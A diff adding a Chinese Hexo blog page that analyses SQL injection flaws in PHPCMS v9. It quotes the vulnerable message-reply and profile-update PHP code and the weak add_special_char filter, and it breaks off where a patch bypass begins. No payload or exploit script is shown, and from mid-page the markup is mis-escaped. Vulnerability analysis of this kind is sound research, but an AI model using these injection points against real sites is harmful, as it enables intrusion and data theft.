@@ -1,0 +1,779 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="phpcms,绕过补丁," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="PHPCMS&amp;nbsp;v9&amp;nbsp;注入和getwebshell&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;0x00&amp;nbsp;前言&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;&amp;lt;o:p&amp;gt;&amp;lt;/">
+<meta name="keywords" content="phpcms,绕过补丁">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHPCMS v9 的那些注入和getwebshell">
+<meta property="og:url" content="http://yoursite.com/2013/03/05/PHPCMS-v9-的那些注入和getwebshell/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="PHPCMS&amp;nbsp;v9&amp;nbsp;注入和getwebshell&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;0x00&amp;nbsp;前言&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;&amp;lt;o:p&amp;gt;&amp;lt;/">
+<meta property="og:updated_time" content="2018-02-26T06:00:09.740Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PHPCMS v9 的那些注入和getwebshell">
+<meta name="twitter:description" content="PHPCMS&amp;nbsp;v9&amp;nbsp;注入和getwebshell&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;0x00&amp;nbsp;前言&amp;lt;o:p&amp;gt;&amp;lt;/o:p&amp;gt;&amp;lt;o:p&amp;gt;&amp;lt;/">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2013/03/05/PHPCMS-v9-的那些注入和getwebshell/"/>
+
+
+
+
+
+  <title>PHPCMS v9 的那些注入和getwebshell | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/03/05/PHPCMS-v9-的那些注入和getwebshell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">PHPCMS v9 的那些注入和getwebshell</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-03-05T10:17:21+08:00">
+                2013-03-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/0day漏洞/" itemprop="url" rel="index">
+                    <span itemprop="name">0day漏洞</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <div class="Section0"><br><br><span style="mso-spacerun:’yes’;font-size:15.0000pt;font-family:’宋体’;">PHPCMS&nbsp;v9&nbsp;<span style="font-family:宋体;">注入和</span><span style="font-family:’Times New Roman’;">getwebshell</span></span><span style="mso-spacerun:’yes’;font-size:15.0000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:15.0000pt;font-family:’宋体’;"><span style="font-family:’Times New Roman’;"><br><br></span></span><br><br><span style="mso-spacerun:’yes’;font-size:15.0000pt;font-family:’宋体’;"><span style="font-family:’Times New Roman’;"><br><br></span></span><br><br><span style="mso-spacerun:’yes’;font-size:15.0000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x00&nbsp;<span style="font-family:宋体;">前言</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x01&nbsp;<span style="font-family:宋体;">新年左右的注入</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x02&nbsp;<span style="font-family:宋体;">绕过厂商的补丁</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x03&nbsp;<span style="font-family:宋体;">破不开的密码</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x04&nbsp;<span style="font-family:宋体;">曾经的</span><span style="font-family:’Times New Roman’;">getwebshell</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x05&nbsp;<span style="font-family:宋体;">补漏了</span><span style="font-family:’Times New Roman’;">apache</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x06&nbsp;Exploit<span style="font-family:宋体;">编写</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x07&nbsp;<span style="font-family:宋体;">结束语</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x00&nbsp;<span style="font-family:宋体;">前言</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;"><span style="font-family:宋体;"><br><br></span></span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;"><span style="font-family:宋体;"><br><br></span></span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">PHPCMS&nbsp;V9<span style="font-family:宋体;">（后面简称</span><span style="font-family:’Times New Roman’;">V9</span><span style="font-family:宋体;">）采用</span><span style="font-family:’Times New Roman’;">PHP5+MYSQL</span><span style="font-family:宋体;">做为技术基础进行开发。</span><span style="font-family:’Times New Roman’;">V9</span><span style="font-family:宋体;">采用</span><span style="font-family:’Times New Roman’;">OOP</span><span style="font-family:宋体;">（面向对象）方式进行基础运行框架搭建。模块化开发方式做为功能开发形式。框架易于功能扩展，代码维护，优秀的二次开发能力，可满足所有网站的应用需求。&nbsp;</span><span style="font-family:’Times New Roman’;">5</span><span style="font-family:宋体;">年开发经验的优秀团队，在掌握了丰富的</span><span style="font-family:’Times New Roman’;">WEB</span><span style="font-family:宋体;">开发经验和</span><span style="font-family:’Times New Roman’;">CMS</span><span style="font-family:宋体;">产品开发经验的同时，勇于创新追求完美的设计理念，为全球多达</span><span style="font-family:’Times New Roman’;">10</span><span style="font-family:宋体;">万网站提供助力，并被更多的政府机构、教育机构、事业单位、商业企业、个人站长所认可。&nbsp;</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">V9<span style="font-family:宋体;">在保留</span><span style="font-family:’Times New Roman’;">2008</span><span style="font-family:宋体;">版的特点的同时，对新版本作出重大的创新，以期待全新的</span><span style="font-family:’Times New Roman’;">PHPCMS</span><span style="font-family:宋体;">系统服务更多的用户。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">（以上复制的官网简介）</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">新年到来的时候</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">wooyun<span style="font-family:宋体;">和</span><span style="font-family:’Times New Roman’;">t00ls</span><span style="font-family:宋体;">上都有把</span><span style="font-family:’Times New Roman’;">phpcms&nbsp;v9</span><span style="font-family:宋体;">的漏洞作为新年礼物发布出来和大家分享，我也去下载了最新的</span><span style="font-family:’Times New Roman’;">phpcms&nbsp;v9</span><span style="font-family:宋体;">的程序分析了下代码，在此把一些菜鸟的心得说给大家听下，望大家指正。</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">0x01&nbsp;<span style="font-family:宋体;">新年左右的注入</span></span><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">1.</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">短消息回复注入</span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:php; toolbar: true; auto-links: true;">/phpcms/modules/message/index.php<br>public function reply() {<br>if(isset($_POST[’dosubmit’])) {<br>$messageid = intval($_POST[’info’][’replyid’]);<br>//判断当前会员，是否可发，短消息．<br>$this-&gt;message_db-&gt;messagecheck($this-&gt;_userid);<br> //检查此消息是否有权限回复<br>$this-&gt;check_user($messageid,’to’);<br>$_POST[’info’][’send_from_id’] = $this-&gt;_username;<br>$_POST[’info’][’message_time’] = SYS_TIME;<br>$_POST[’info’][’status’] = ’1’;<br>$_POST[’info’][’folder’] = ’inbox’;<br>$_POST[’info’][’content’] = safe_replace($_POST[’info’][’content’]);<br>$_POST[’info’][’subject’] = safe_replace($_POST[’info’][’subject’]);<br>if(empty($_POST[’info’][’send_to_id’])) {<br>howmessage(L(’user_noempty’),HTTP_REFERER);<br>}<br>$messageid = $this-&gt;message_db-&gt;insert($_POST[’info’],true);//这儿数据传入                        if(!$messageid) return FALSE;<br>showmessage(L(’operation_success’),HTTP_REFERER);<br>} else {<br>$show_validator = $show_scroll = $show_header = true;<br>include template(’message’, ’send’);<br>}<br>}</pre><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">上边把<span style="font-family:’Times New Roman’;">POST</span><span style="font-family:宋体;">数据直接传入了</span><span style="font-family:’Times New Roman’;">insert</span><span style="font-family:宋体;">函数</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">Mysql.class.php<span style="font-family:宋体;">中</span><span style="font-family:’Times New Roman’;">:</span></span><span style="mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:php; toolbar: true; auto-links: true;">public function insert($data, $table, $return_insert_id = false, $replace = false) {<br>if(!is_array( $data ) || $table == ’’ || count($data) == 0) {<br>        return false;<br>     }<br>    $fielddata = array_keys($data);//这儿直接以数组下标作为字段<br>    $valuedata = array_values($data);<br>    array_walk($fielddata, array($this, ’add_special_char’));<br>//到了关键地方，关键的过滤函数add_special_char<br>array_walk($valuedata, array($this, ’escape_string’));<br>    $field = implode (’,’, $fielddata);<br>    $value = implode (’,’, $valuedata);<br>    $cmd = $replace ? ’REPLACE INTO’ : ’INSERT INTO’;<br>    $sql = $cmd.’ <code>’.$this-&amp;gt;config[’database’].’</code>.<code>’.$table.’</code>(’.$field.’) VALUES (’.$value.’)’;<br>    $return = $this-&gt;execute($sql);<br>return $return_insert_id ? $this-&gt;insert_id() : $return;<br>}</pre><br><br><span style="font-size:10.5pt;font-family:宋体;">漏洞函数出现了：</span><span style="font-size:10.5pt;font-family:宋体;">&lt;o:p&gt;&lt;/o:p&gt;</span><br><br><pre class="brush:php; toolbar: true; auto-links: true;">public function add_special_char(&amp;$value) {<br>if(’&amp;#42’ == $value || false !== strpos($value, ’(’) || false !== strpos($value, ’.’) || false !== strpos ( $value, ’<code>’)) {
+//不处理包含&amp;#42 或者 使用了sql方法。
+} else {
+$value = ’</code>’.trim($value).’<code>’;
+}
+return $value;
+}&lt;/pre&gt;
+
+&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;上边过滤函数没有有效过滤&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;
+
+&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;
+
+&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;2.&lt;span style=&quot;font-family:宋体;&quot;&gt;生日修改注入&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;
+
+&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;
+
+&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;漏洞函数&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;
+
+&lt;pre class=&quot;brush:php; toolbar: true; auto-links: true;&quot;&gt;/phpcms/modules/member/index.php
+public function account_manage_info() {
+if(isset($_POST[’dosubmit’])) {
+ //更新用户昵称
+$nickname = isset($_POST[’nickname’]) &amp;amp;&amp;amp; trim($_POST[’nickname’]) ? trim($_POST[’nickname’]) : ’’;
+if($nickname) {
+$this-&amp;gt;db-&amp;gt;update(array(’nickname’=&amp;gt;$nickname), array(’userid’=&amp;gt;$this-&amp;gt;memberinfo[’userid’]));
+     if(!isset($cookietime)) {
+      $get_cookietime = param::get_cookie(’cookietime’);
+     }
+     $_cookietime = $cookietime ? intval($cookietime) : ($get_cookietime ? $get_cookietime : 0);
+     $cookietime = $_cookietime ? TIME + $_cookietime : 0;
+     param::set_cookie(’_nickname’, $nickname, $cookietime);
+ }
+ require_once CACHE_MODEL_PATH.’member_input.class.php’;
+ require_once CACHE_MODEL_PATH.’member_update.class.php’;
+ $member_input = new member_input($this-&amp;gt;memberinfo[’modelid’]);
+ $modelinfo = $member_input-&amp;gt;get($_POST[’info’]);//数据传入get函数，经过get函数对注入语句无影响
+ $this-&amp;gt;db-&amp;gt;set_model($this-&amp;gt;memberinfo[’modelid’]);
+ $membermodelinfo = $this-&amp;gt;db-&amp;gt;get_one(array(’userid’=&amp;gt;$this-&amp;gt;memberinfo[’userid’]));
+ if(!empty($membermodelinfo)) {
+     $this-&amp;gt;db-&amp;gt;update($modelinfo, array(’userid’=&amp;gt;$this-&amp;gt;memberinfo[’userid’])); //进入sql语句形成注入
+ } else {
+     $modelinfo[’userid’] = $this-&amp;gt;memberinfo[’userid’];
+     $this-&amp;gt;db-&amp;gt;insert($modelinfo);
+ }
+Mysql.class.php文件
+public function update($data, $table, $where = ’’) {
+if($table == ’’ or $where == ’’) {
+return false;
+}
+$where = ’ WHERE ’.$where;
+$field = ’’;
+if(is_string($data) &amp;amp;&amp;amp; $data != ’’) {
+$field = $data;
+} elseif (is_array($data) &amp;amp;&amp;amp; count($data) &amp;gt; 0) {
+$fields = array();
+foreach($data as $k=&amp;gt;$v) {
+switch (substr($v, 0, 2)) {
+case ’+=’:
+$v = substr($v,2);
+if (is_numeric($v)) {
+$fields[] =$this-&amp;gt;add_special_char($k).’=’.$this-&amp;gt;add_special_char($k).’+’.$this-&amp;gt;escape_string($v, ’’, false);
+} else {
+continue;
+}
+break;
+case ’-=’:
+$v = substr($v,2);
+if (is_numeric($v)) {
+$fields[] =$this-&amp;gt;add_special_char($k).’=’.$this-&amp;gt;add_special_char($k).’-’.$this-&amp;gt;escape_string($v, ’’, false);
+} else {continue;}
+break;
+default:
+$fields[] = $this-&amp;gt;add_special_char($k).’=’.$this-&amp;gt;escape_string($v);
+}
+}
+$field = implode(’,’, $fields);
+} else {
+return false;
+}
+$sql = ’UPDATE</code>’.$this-&gt;config[’database’].’<code>.</code>’.$table.’<code>SET ’.$field.$where;
+return $this-&amp;gt;execute($sql);
+}&lt;/pre&gt;
+
+&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;
+
+&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;可以清楚的看出又是使用的&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;add_special_char&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;函数过滤哦。所以其实这两个注入都是利用的程序设计的同一个&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;bug&lt;span style=&quot;font-family:宋体;&quot;&gt;。&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;
+
+&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;
+
+&lt;span style=&quot;mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;0x02&amp;nbsp;&lt;span style=&quot;font-family:宋体;&quot;&gt;绕过厂商的补丁&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;
+
+&lt;span style=&quot;mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;
+
+&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;当让漏洞被发现者上报&lt;span style=&quot;font-family:’Times New Roman’;&quot;&gt;wooyun&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;后厂商也做了相应的补丁，厂商也找到了漏洞的根源也就是：&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:’Times New Roman’;&quot;&gt;public&amp;nbsp;function&amp;nbsp;add_special_char(&amp;amp;$value)&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:宋体;&quot;&gt;函数&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:宋体;&quot;&gt;。&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:宋体;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;
+
+&lt;span style=&quot;font-size:10.5pt;font-family:宋体;&quot;&gt;补丁后函数如下：&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:宋体;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt;
+
+&lt;pre class=&quot;brush:php; toolbar: true; auto-links: true;&quot;&gt;public function add_special_char(&amp;amp;$value) {
